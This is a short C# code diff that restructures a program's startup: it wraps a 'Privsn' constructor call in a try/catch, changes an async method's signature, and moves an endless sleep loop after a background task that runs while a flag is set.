@@ -54,14 +54,15 @@ namespace cevsn
             }
             gotHostInformation = false;
             Running = true;
-            new Privsn();
-            while(true)
+            try
             {
-                Thread.Sleep(5000);
+                new Privsn();
+            } catch (Exception e) {
+                Console.Write(e);
             }
         }
 
-        public static async Task lul(string[] args)
+        public static async void lul()
         {
             osName = getOsName();
             if(osName.Contains("Win"))
@@ -323,7 +324,6 @@ namespace cevsn
             osName = getOsName();
             gotHostInformation = false;
             Running = true;
-
             Task.Factory.StartNew(() => 
             {
                 while(Running)
@@ -491,6 +491,10 @@ namespace cevsn
                 }
 
             });
+            while(true)
+            {
+                Thread.Sleep(3000);
+            }
             return 0;
         }
     }
